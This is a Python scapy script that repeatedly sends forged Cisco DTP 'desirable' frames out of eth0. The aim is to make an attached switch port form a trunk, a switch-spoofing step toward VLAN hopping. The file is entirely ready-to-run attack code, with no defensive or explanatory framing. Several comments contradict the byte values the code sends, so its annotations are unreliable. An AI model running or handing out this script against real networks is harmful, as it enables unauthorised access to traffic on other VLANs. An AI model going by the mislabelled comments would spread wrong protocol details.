import time
from scapy.all import *
from scapy.layers.l2 import Dot3, LLC, SNAP

def send_dtp_desirable_frame(interface):
    # Get the source MAC address of the interface
    source_mac = get_if_hwaddr(interface)

    # Build the IEEE 802.3 Ethernet header (Dot3) with Length field
    dot3 = Dot3(dst="01:00:0c:cc:cc:cc", src=source_mac)

    # LLC/SNAP header
    llc = LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2004)

    # DTP Header (Version and Reserved)
    dtp_header = b'\x01'  # Version: 1, 3 bytes of reserved zeros (no struct.pack)

    # Domain TLV (Type: 0x0001, Length: 0x0005, Value: 1 byte of 0x00)
    dtp_tlv_domain = b'\x00\x01\x00\x05\x00'  # Type 0x0001, Length 0x0005, empty value (0x00)

    # Trunk Status TLV (Type: 0x0002, Length: 0x0005, Value: 0x04 'Access/Auto')
    dtp_tlv_status = b'\x00\x02\x00\x05\x83'  # Type 0x0002, Length 0x0005, value 0x04

    # Trunk Type TLV (Type: 0x0003, Length: 0x0005, Value: 0x45 'ISL/802.1Q')
    dtp_tlv_type = b'\x00\x03\x00\x05\xa5'    # Type 0x0003, Length 0x0005, value 0x45

    # Sender ID TLV (Type: 0x0004, Length: 0x000A, Value: 6-byte MAC address)
    mac_bytes = bytes.fromhex(source_mac.replace(':', ''))
    dtp_tlv_sender = b'\x00\x04\x00\x0a' + mac_bytes  # Type 0x0004, Length 0x000A, MAC address

    # Combine DTP payload
    dtp_payload = dtp_header + dtp_tlv_domain + dtp_tlv_status + dtp_tlv_type + dtp_tlv_sender

    # Build the LLC/SNAP header and DTP payload
    payload = llc / snap / Raw(dtp_payload)

    # Calculate the length of the payload for the Dot3 header
    dot3.len = len(payload)  # Set the length field in the Dot3 header

    # Build the full packet    
    dtp_packet = dot3 / payload

    # Ensure the total frame length is at least 60 bytes (excluding FCS)
    if len(dtp_packet) < 60:
        dtp_packet = dtp_packet / Raw(b'\x00' * (60 - len(dtp_packet)))

    # Send the packet in a loop
    while True:
        sendp(dtp_packet, iface=interface, verbose=False)
        time.sleep(1)

# Start sending frames on the specified interface
send_dtp_desirable_frame('eth0')
